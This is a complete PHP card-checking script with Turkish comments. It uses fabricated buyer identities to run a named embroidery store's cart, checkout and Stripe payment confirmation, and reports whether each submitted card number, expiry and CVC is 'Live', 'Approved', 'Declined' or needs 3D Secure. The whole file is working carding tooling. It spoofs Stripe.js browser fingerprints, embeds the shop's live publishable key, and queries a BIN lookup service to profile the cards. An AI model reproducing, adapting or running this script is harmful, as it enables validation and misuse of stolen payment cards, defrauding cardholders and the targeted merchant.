<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$card = isset($_GET['card']) ? trim($_GET['card']) : null;

if (!$card || substr_count($card, '|') !== 3) {
    echo json_encode(['basari' => false, 'mesaj' => 'Format: ?card=NUMBER|MM|YY|CVC'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    exit;
}

list($n, $m, $y, $c) = explode('|', $card);
$m = str_pad($m, 2, '0', STR_PAD_LEFT);
$y = strlen($y) == 2 ? '20'.$y : $y;

// BIN
$bin = substr($n, 0, 6);
$bin_info = bin_bilgi($bin);

// Rastgele bilgiler
$first_names = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles"];
$last_names = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"];
$states = ["Iowa","Ohio","Texas","Florida","California","New York","Illinois","Pennsylvania","Michigan","Georgia"];
$zips = ["10001","20001","30001","60601","77001","19101","85001","75201","92101","33101"];

$fn = $first_names[array_rand($first_names)];
$ln = $last_names[array_rand($last_names)];
$email = strtolower($fn.'.'.$ln.rand(10,999)).'@gmail.com';
$phone = rand(100,999).rand(100,999).rand(1000,9999);
$state = $states[array_rand($states)];
$zip = $zips[array_rand($zips)];
$full = "$fn $ln";

$STRIPE_PK = "pk_live_51RRyAdLKBtCy0WIH0gy3ddK2cth9zXB33leFM7W8Z6MoiaySLA3zSv7Sfa5McdYWug55SZzCAzJ23OzspAJD9KFb00Z9wfJyJ7";
$WALLET_CONFIG_ID = "a94ebed5-9375-4a02-b763-91a4681a3140";
$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36";

$guid = gen_uuid();
$muid = gen_uuid();
$sid = gen_uuid();
$client_session_id = gen_uuid();
$time_on_page = rand(10000, 60000);

// TEK BİR COOKIE DOSYASI - TÜM İSTEKLER İÇİN
$cookie_jar = tempnam(sys_get_temp_dir(), 'STRIPE_SESSION_');

// Step 1: Add to cart
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        "action" => "add_to_cart", 
        "cart_id" => "", 
        "sku" => "40010",
        "choice1" => "PES~Large", 
        "quantity" => "1", 
        "x" => "122", 
        "y" => "2",
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookie_jar,      // DÜZELTİLDİ
    CURLOPT_COOKIEJAR => $cookie_jar,       // DÜZELTİLDİ
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => [
        "Origin: https://www.advanced-embroidery-designs.com",
        "Referer: https://www.advanced-embroidery-designs.com/html/40010.html",
    ],
]);
$r1 = curl_exec($ch); 
$http1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Step 2: View cart
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi?action=view_cart&pwkch=1',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookie_jar,      // DÜZELTİLDİ
    CURLOPT_COOKIEJAR => $cookie_jar,       // DÜZELTİLDİ
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => ["Referer: https://www.advanced-embroidery-designs.com/html/40010.html"],
]);
$r2 = curl_exec($ch); 
$http2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Step 3: Checkout
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        "shipping_company" => $ln, 
        "shipping_name" => $fn, 
        "shipping_lastname" => $ln,
        "email" => $email, 
        "daytime_phone" => $phone, 
        "home_phone" => $phone,
        "shipping_state" => $state, 
        "payment_method" => "Credit Card via Stripe",
        "action" => "check_shipping_country", 
        "cart_id" => "", 
        "shipping_method" => "",
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookie_jar,      // DÜZELTİLDİ
    CURLOPT_COOKIEJAR => $cookie_jar,       // DÜZELTİLDİ
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => [
        "Origin: https://www.advanced-embroidery-designs.com",
        "Referer: https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi?action=view_cart&pwkch=1",
    ],
]);
$r3 = curl_exec($ch); 
$http3 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Debug kontrolleri
if ($http3 != 200) {
    echo json_encode(['basari' => false, 'mesaj' => "Checkout hatası (HTTP $http3) - Session korunamadı"], JSON_UNESCAPED_UNICODE);
    exit;
}

// Step 4: Create intent
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/create_intent.cgi',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode([
        "cart_id" => "", 
        "shipping_method" => "", 
        "shipping_state" => $state
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookie_jar,      // DÜZELTİLDİ
    CURLOPT_COOKIEJAR => $cookie_jar,       // DÜZELTİLDİ
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json",
        "Origin: https://www.advanced-embroidery-designs.com",
        "Referer: https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi",
    ],
]);
$intent_resp = curl_exec($ch); 
$http4 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Debug: Intent yanıtını logla
if ($http4 != 200 || empty($intent_resp)) {
    echo json_encode([
        'basari' => false, 
        'mesaj' => "Intent oluşturulamadı (HTTP $http4)", 
        'debug' => substr($intent_resp, 0, 200)
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

$intent_data = json_decode($intent_resp, true);
if (!$intent_data) {
    echo json_encode([
        'basari' => false, 
        'mesaj' => 'Intent JSON parse edilemedi', 
        'debug' => substr($intent_resp, 0, 200)
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

$client_secret = $intent_data['clientSecret'] ?? $intent_data['client_secret'] ?? '';
if (!$client_secret) {
    echo json_encode([
        'basari' => false, 
        'mesaj' => 'Intent oluşturulamadı - client_secret bulunamadı', 
        'debug' => json_encode($intent_data)
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

$pi_id = explode('_secret_', $client_secret)[0];

// Step 5: Confirm payment
$confirm_data = http_build_query([
    "payment_method_data[type]" => "card",
    "payment_method_data[billing_details][name]" => $full,
    "payment_method_data[billing_details][email]" => $email,
    "payment_method_data[billing_details][address][postal_code]" => $zip,
    "payment_method_data[card][number]" => $n,
    "payment_method_data[card][cvc]" => $c,
    "payment_method_data[card][exp_month]" => $m,
    "payment_method_data[card][exp_year]" => substr($y, -2),
    "payment_method_data[guid]" => $guid,
    "payment_method_data[muid]" => $muid,
    "payment_method_data[sid]" => $sid,
    "payment_method_data[pasted_fields]" => "number",
    "payment_method_data[payment_user_agent]" => "stripe.js/39914d4bef; stripe-js-v3/39914d4bef; card-element",
    "payment_method_data[referrer]" => "https://www.advanced-embroidery-designs.com",
    "payment_method_data[time_on_page]" => $time_on_page,
    "payment_method_data[client_attribution_metadata][client_session_id]" => $client_session_id,
    "payment_method_data[client_attribution_metadata][merchant_integration_source]" => "elements",
    "payment_method_data[client_attribution_metadata][merchant_integration_subtype]" => "card-element",
    "payment_method_data[client_attribution_metadata][merchant_integration_version]" => "2017",
    "payment_method_data[client_attribution_metadata][wallet_config_id]" => $WALLET_CONFIG_ID,
    "expected_payment_method_type" => "card",
    "use_stripe_sdk" => "true",
    "key" => $STRIPE_PK,
    "client_secret" => $client_secret,
]);

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.stripe.com/v1/payment_intents/$pi_id/confirm",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $confirm_data,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/x-www-form-urlencoded",
        "Origin: https://js.stripe.com",
        "Referer: https://js.stripe.com/",
    ],
]);
$response = curl_exec($ch); 
curl_close($ch);

// Geçici dosyayı temizle
@unlink($cookie_jar);

$resp = json_decode($response, true);

if (isset($resp['error'])) {
    $err = $resp['error'];
    $msg = $err['message'] ?? $err['code'] ?? 'Declined';
    $code = $err['code'] ?? '';
    $decline = $err['decline_code'] ?? '';

    if ($code === 'incorrect_cvc' || stripos($msg, 'cvc') !== false || stripos($msg, 'security code') !== false) {
        echo json_encode(['basari' => true, 'kart' => $card, 'durum' => 'CCN Live', 'mesaj' => '✅ Kart Numarası Geçerli (CVV Yanlış)', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    } elseif ($code === 'card_declined' || stripos($msg, 'declined') !== false || $decline) {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Declined', 'mesaj' => '❌ Reddedildi - ' . ($decline ?: $msg), 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    } elseif ($code === 'incorrect_number' || $code === 'invalid_number') {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Invalid', 'mesaj' => '❌ Geçersiz Kart Numarası', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    } elseif ($code === 'expired_card') {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Expired', 'mesaj' => '❌ Kart Süresi Geçmiş', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    } else {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Error', 'mesaj' => '⚠️ ' . $msg, 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    }
} else {
    $status = $resp['status'] ?? '';
    $pi_status = $resp['payment_intent']['status'] ?? $resp['status'] ?? '';
    if ($status === 'succeeded' || $pi_status === 'succeeded') {
        echo json_encode(['basari' => true, 'kart' => $card, 'durum' => 'Approved', 'mesaj' => '✅ Ödeme Onaylandı!', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    } elseif ($status === 'requires_action' || $pi_status === 'requires_action') {
        echo json_encode(['basari' => true, 'kart' => $card, 'durum' => '3DS', 'mesaj' => '⚠️ 3D Secure Gerekli (Kart Geçerli)', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    } else {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Unknown', 'mesaj' => '⚠️ ' . ($status ?: 'Bilinmeyen'), 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    }
}

function gen_uuid() { 
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x', 
        mt_rand(0,0xffff), mt_rand(0,0xffff), 
        mt_rand(0,0xffff), mt_rand(0,0xffff), 
        mt_rand(0,0x0fff)|0x4000, mt_rand(0,0x3fff)|0x8000, 
        mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff)
    ); 
}

function bin_bilgi($bin) {
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $resp = @file_get_contents("https://bins.antipublic.cc/bins/$bin", false, $ctx);
    if ($resp) { 
        $data = json_decode($resp, true); 
        return [
            'Banka' => $data['bank'] ?? 'Bilinmiyor', 
            'Ulke' => $data['country'] ?? 'Bilinmiyor', 
            'Marka' => ($data['brand'] ?? '?'), 
            'Tur' => ($data['type'] ?? '?')
        ]; 
    }
    return ['Banka' => 'Bilinmiyor', 'Ulke' => 'Bilinmiyor', 'Marka' => '?', 'Tur' => '?'];
}
?>
